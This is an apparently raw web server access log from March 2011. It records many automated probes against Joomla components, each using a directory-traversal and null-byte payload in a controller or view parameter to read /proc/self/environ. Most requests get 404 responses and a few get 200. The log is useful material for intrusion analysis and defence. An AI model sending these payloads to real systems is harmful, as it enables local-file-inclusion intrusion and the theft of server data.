88.191.75.19 - - [21/Mar/2011:15:34:12 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
80.38.87.254 - - [21/Mar/2011:15:34:41 +0900] "GET /index.php?option=com_econtent&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
88.191.75.19 - - [21/Mar/2011:15:36:36 +0900] "GET //index.php?option=com_juliaportfolio&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
88.191.75.19 - - [21/Mar/2011:15:37:29 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
123.30.110.38 - - [21/Mar/2011:15:38:33 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
123.30.110.38 - - [21/Mar/2011:15:38:43 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
62.133.201.54 - - [21/Mar/2011:15:38:55 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
123.30.110.38 - - [21/Mar/2011:15:39:00 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
123.30.110.38 - - [21/Mar/2011:15:39:10 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
204.232.242.223 - - [21/Mar/2011:15:39:36 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
204.232.242.223 - - [21/Mar/2011:15:40:42 +0900] "GET //index.php?option=com_janews&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:40:44 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
62.133.201.54 - - [21/Mar/2011:15:40:48 +0900] "GET //index.php?option=com_ganalytics&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:40:49 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:40:56 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:40:58 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:40:58 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:41:02 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:41:06 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
204.232.242.223 - - [21/Mar/2011:15:41:46 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:15:42:00 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
222.231.63.26 - - [21/Mar/2011:15:42:06 +0900] "GET //index.php?option=com_g2bridge&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:15:42:11 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:15:42:23 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
192.188.242.80 - - [21/Mar/2011:15:42:52 +0900] "POST /contact.php HTTP/1.1" 404 217
76.97.16.122 - - [21/Mar/2011:15:42:56 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
192.188.242.80 - - [21/Mar/2011:15:42:59 +0900] "POST /access_log.last/contact.php HTTP/1.1" 404 233
204.232.242.223 - - [21/Mar/2011:15:43:26 +0900] "GET //index.php?option=com_linkr&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:15:43:33 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:15:43:57 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
184.107.165.2 - - [21/Mar/2011:15:45:01 +0900] "GET //index.php?option=com_perchafieldsattach&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
192.188.242.80 - - [21/Mar/2011:15:45:38 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
192.188.242.80 - - [21/Mar/2011:15:45:44 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
192.188.242.80 - - [21/Mar/2011:15:45:44 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
192.188.242.80 - - [21/Mar/2011:15:45:46 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
192.188.242.80 - - [21/Mar/2011:15:45:49 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
204.232.242.223 - - [21/Mar/2011:15:45:57 +0900] "GET //index.php?option=com_perchagallery&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
204.232.242.223 - - [21/Mar/2011:15:46:25 +0900] "GET //index.php?option=com_perchagallery&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
192.188.242.80 - - [21/Mar/2011:15:46:26 +0900] "GET //index.php?option=com_rpx&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
79.168.153.181 - - [21/Mar/2011:15:46:46 +0900] "GET //index.php?option=com_joomlapicasa2&controller=..//..//..//..//..//..//..//..///proc/self/environ%0000 HTTP/1.1" 404 216
79.168.153.181 - - [21/Mar/2011:15:46:46 +0900] "GET //index.php?option=com_joomlapicasa2&controller=..//..//..//..//..//..//..//..///proc/self/environ%0000 HTTP/1.1" 404 216
188.40.100.196 - - [21/Mar/2011:15:47:09 +0900] "GET //index.php?option=com_perchaimageattach&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
27.131.1.56 - - [21/Mar/2011:15:48:11 +0900] "GET ///?option=com_alphauserpoints&view=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 200 955
188.40.100.196 - - [21/Mar/2011:15:48:15 +0900] "GET //index.php?option=com_perchaimageattach&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
112.216.153.186 - - [21/Mar/2011:15:48:17 +0900] "GET /access_log.last//index2.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 233
112.216.153.186 - - [21/Mar/2011:15:48:17 +0900] "GET //index2.php?option=com_ganalytics&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
94.199.178.9 - - [21/Mar/2011:15:51:35 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
149.31.6.24 - - [21/Mar/2011:15:51:40 +0900] "GET /index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
149.31.6.24 - - [21/Mar/2011:15:51:40 +0900] "GET /index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
149.31.6.24 - - [21/Mar/2011:15:52:02 +0900] "GET /access_log.last/index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
149.31.6.24 - - [21/Mar/2011:15:52:02 +0900] "GET /index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
149.31.6.24 - - [21/Mar/2011:15:52:04 +0900] "GET /access_log.last/index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
149.31.6.24 - - [21/Mar/2011:15:52:04 +0900] "GET /index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
149.31.6.24 - - [21/Mar/2011:15:52:14 +0900] "GET /access_log.last/index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
94.199.178.9 - - [21/Mar/2011:15:52:15 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
149.31.6.24 - - [21/Mar/2011:15:52:15 +0900] "GET /index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
149.31.6.24 - - [21/Mar/2011:15:52:17 +0900] "GET /access_log.last/index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
149.31.6.24 - - [21/Mar/2011:15:52:17 +0900] "GET /index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
94.199.178.9 - - [21/Mar/2011:15:52:30 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
88.191.75.19 - - [21/Mar/2011:15:52:34 +0900] "GET //index.php?option=com_rokdownloads&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
149.31.6.24 - - [21/Mar/2011:15:53:31 +0900] "GET /index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
149.31.6.24 - - [21/Mar/2011:15:53:32 +0900] "GET /index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
149.31.6.24 - - [21/Mar/2011:15:55:52 +0900] "GET /access_log.last/index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
149.31.6.24 - - [21/Mar/2011:15:55:53 +0900] "GET /index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
149.31.6.24 - - [21/Mar/2011:15:56:07 +0900] "GET /access_log.last/index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 231
149.31.6.24 - - [21/Mar/2011:15:56:07 +0900] "GET /index.php?option=com_weberpcustomer&controller=../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 215
69.67.54.185 - - [21/Mar/2011:15:56:30 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:56:33 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:56:36 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:56:38 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:56:40 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:56:54 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
69.67.54.185 - - [21/Mar/2011:15:57:03 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:15:58:39 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.63.99.78 - - [21/Mar/2011:15:59:24 +0900] "GET //index2.php?option=com_simpledownload&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
217.16.3.142 - - [21/Mar/2011:15:59:33 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
222.231.63.26 - - [21/Mar/2011:16:07:29 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
222.231.63.26 - - [21/Mar/2011:16:07:35 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
222.231.63.26 - - [21/Mar/2011:16:07:46 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
222.231.63.26 - - [21/Mar/2011:16:08:06 +0900] "GET //index.php?option=com_ninjarsssyndicator&controller=../../../../../../../../../../../../../../../proc/self/environ%00 HTTP/1.1" 404 216
62.93.185.27 - - [21/Mar/2011:16:08:11 +0900] "GET //index2.php?option=com_ccnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
62.93.185.27 - - [21/Mar/2011:16:08:11 +0900] "GET ///index2.php?option=com_ccnewsletter&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 218
94.23.35.111 - - [21/Mar/2011:16:13:07 +0900] "GET /?option=com_jinventory&controller=../../../../../../../../../../../../..//proc/self/environ%00 HTTP/1.1" 200 954
94.199.178.9 - - [21/Mar/2011:16:14:01 +0900] "GET //index.php?option=com_sbsfile&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.63.99.78 - - [21/Mar/2011:16:15:25 +0900] "GET //index.php?option=com_product&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
94.23.35.111 - - [21/Mar/2011:16:16:01 +0900] "GET /?option=com_redtwitter&view=../../../../../../../../../../../../..//proc/self/environ%00 HTTP/1.1" 200 954
216.119.135.66 - - [21/Mar/2011:16:24:24 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
216.119.135.66 - - [21/Mar/2011:16:24:28 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
216.119.135.66 - - [21/Mar/2011:16:25:05 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
217.16.3.142 - - [21/Mar/2011:16:25:42 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:16:26:02 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:16:26:15 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:16:26:32 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:16:26:33 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
49.0.4.161 - - [21/Mar/2011:16:26:45 +0900] "GET //index.php?option=com_joomlapicasa2&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
76.97.16.122 - - [21/Mar/2011:16:28:17 +0900] "GET //index.php?option=com_jeformcr&view=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
218.146.252.33 - - [21/Mar/2011:16:29:10 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
218.146.252.33 - - [21/Mar/2011:16:29:21 +0900] "GET //index2.php?option=com_google&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 217
217.16.3.142 - - [21/Mar/2011:16:30:17 +0900] "GET //index.php?option=com_ckforms&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
217.16.3.142 - - [21/Mar/2011:16:30:17 +0900] "GET //index.php?option=com_ckforms&controller=../../../../../../../../../../../../../../../../../../../../../../../../proc/self/environ%0000 HTTP/1.1" 404 216
178.63.99.78 - - [21/Mar/2011:16:34:33 +0900] "GET //index.php?option=com_simpledownload&controller=../../../../../../../../../../../../../../../../../../../../../../../..//proc/self/environ%0000 HTTP/1.1" 404 216
